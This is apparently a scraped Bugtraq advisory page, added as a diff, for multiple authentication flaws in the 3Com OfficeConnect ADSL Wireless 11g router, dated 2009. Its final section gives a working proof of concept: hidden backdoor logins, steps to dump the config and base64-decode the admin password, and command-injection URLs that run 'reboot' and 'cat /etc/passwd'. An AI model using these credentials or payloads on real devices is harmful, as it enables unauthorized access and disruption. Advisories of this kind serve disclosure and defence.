@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid36722<p><b><span style="font-size: 18pt;">3Com OfficeConnect ADSL Wireless 11g Firewall Router Authentication Multiple Remote Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/36722/info">info</a><br><a href="http://www.securityfocus.com/bid/36722/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/36722/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/36722/solution">solution</a><br><a href="http://www.securityfocus.com/bid/36722/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				36722
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 19 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Oct 19 2009 07:18PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Andrea Fabrizi
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					3Com OfficeConnect ADSL Wireless 11g Firewall Router  3.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use readily available tools to exploit these issues.<br/><br/>These example URIs and proof of concept demonstrate the issues:<br/><br/>1) SSH/Telnet to router using one of these hidden accounts:<br/>   support:support<br/>   user:5<br/>   nobody:admin<br/>2) Type 9<br/>3) Type 1<br/>3) Type 3 to dump the configuration<br/>4) Locate the sysPassword field:<br/>    &amp;lt;sysPassword value="cXdlcnR5Cg=="/&amp;gt;<br/>5) Decode the admin password:<br/>   roland@hp6720s:~$ echo -ne "cXdlcnR5Cg==" | base64 -d<br/>   qwerty<br/><br/>http://www.example.com/utility.cgi?testType=1&amp;amp;IP=aaa || reboot<br/>http://www.example.com/utility.cgi?testType=1&amp;amp;IP=aaa || cat /etc/passwd
+	
+		<ul>
+</ul>
+</div>
